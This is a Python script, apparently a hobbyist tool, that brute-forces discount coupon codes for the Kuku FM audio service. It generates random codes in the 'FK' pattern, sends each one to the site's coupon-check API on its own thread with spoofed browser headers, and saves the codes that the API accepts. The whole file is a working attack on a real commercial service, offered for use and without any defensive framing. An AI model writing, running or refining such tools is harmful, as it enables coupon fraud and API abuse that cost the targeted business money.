import requests
import random
import string
import threading

def generateCoupon():
    pattern_string = 'FK'
    onerandom_chars = ''.join(random.choices(string.ascii_uppercase, k=2))
    tworandom_chars = ''.join(random.choices(string.digits, k=2))
    threerandom_chars = ''.join(random.choices(string.ascii_uppercase, k=1))
    fourrandom_chars = ''.join(random.choices(string.digits, k=2))
    return pattern_string + onerandom_chars + tworandom_chars + threerandom_chars + fourrandom_chars

def verifyCoupon(coupon):
    url = 'https://kukufm.com/api/v1.1/orders/check-coupon-apply/'

    headers = {
        'Origin': 'https://kukufm.com',
        'Referer': f'https://kukufm.com/subscription/hindi?action=pre_apply_coupon&planId=1&couponCode={coupon}',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36 Edg/115.0.0.0'
    }

    payload = {
        'build_number': 'undefined',
        'coupon_code': f'{coupon}',
        'premium_plan_id': '172'
    }

    response = requests.post(url, headers=headers, data=payload)
    if 'Invalid Coupon Code' in response.text:
        pass
    elif 'Congratulations! You Saved Rs. 98' in response.text:
        print(f'[VALID] {coupon}')
        file.write(f'{coupon}\n')

print('''
 █████   ████ █████  █████ █████   ████ █████  █████    ███████████ ██████   ██████
░░███   ███░ ░░███  ░░███ ░░███   ███░ ░░███  ░░███    ░░███░░░░░░█░░██████ ██████ 
 ░███  ███    ░███   ░███  ░███  ███    ░███   ░███     ░███   █ ░  ░███░█████░███ 
 ░███████     ░███   ░███  ░███████     ░███   ░███     ░███████    ░███░░███ ░███ 
 ░███░░███    ░███   ░███  ░███░░███    ░███   ░███     ░███░░░█    ░███ ░░░  ░███ 
 ░███ ░░███   ░███   ░███  ░███ ░░███   ░███   ░███     ░███  ░     ░███      ░███ 
 █████ ░░████ ░░████████   █████ ░░████ ░░████████      █████       █████     █████
░░░░░   ░░░░   ░░░░░░░░   ░░░░░   ░░░░   ░░░░░░░░      ░░░░░       ░░░░░     ░░░░░ 

                          [+] Developed By DE3P4K [+]
''')

thread = int(input('How Many Codes to Generate and Check : '))

threads = []

file_path = 'results.txt'
file = open(file_path, 'a')

for _ in range(thread):
    coupon = generateCoupon()
    thread = threading.Thread(target=verifyCoupon, args=(coupon,))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

file.close()
